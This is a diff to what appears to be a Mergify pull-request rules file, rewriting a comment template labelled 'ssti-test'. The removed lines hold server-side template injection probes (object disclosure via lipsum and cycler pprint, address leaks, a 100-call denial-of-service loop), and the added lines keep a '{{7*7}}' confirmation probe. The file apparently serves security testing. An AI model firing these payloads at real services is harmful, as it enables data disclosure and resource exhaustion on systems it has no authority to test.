@@ -1,20 +1,10 @@
 pull_request_rules:
-  - name: chain-max
+  - name: pprint-test
     conditions:
       - label=ssti-test
     actions:
       comment:
         message: |
-          === OBJECT DISCLOSURE ===
-          LIPSUM_PPRINT={{lipsum|pprint}}
-          CYCLER_PPRINT={{cycler|pprint}}
-          NS_PPRINT={{namespace(secret=lipsum|string,items=dict(a=1).items()|list)|pprint}}
-          === STABLE ADDR CHECK ===
-          ADDR={{lipsum|string}}
-          === LOOP PROPS ===
-          {% for i in range(3) %}IDX={{loop.index0}} REV={{loop.revindex}} DEPTH={{loop.depth}} FIRST={{loop.first}} LAST={{loop.last}},{% endfor %}
-          === DOS AMP (100 lipsum calls) ===
-          {% for i in range(100) %}{{lipsum(n=1,html=False)|truncate(10)}}{% endfor %}
-          === STRING OPS ===
-          UPPER={{(lipsum|string)|upper}}
+          CONFIRM={{7*7}}
           REVERSE={{(lipsum|string)|reverse}}
+          LOOP_DEPTH={% for i in range(2) %}D{{loop.depth}},{% endfor %}
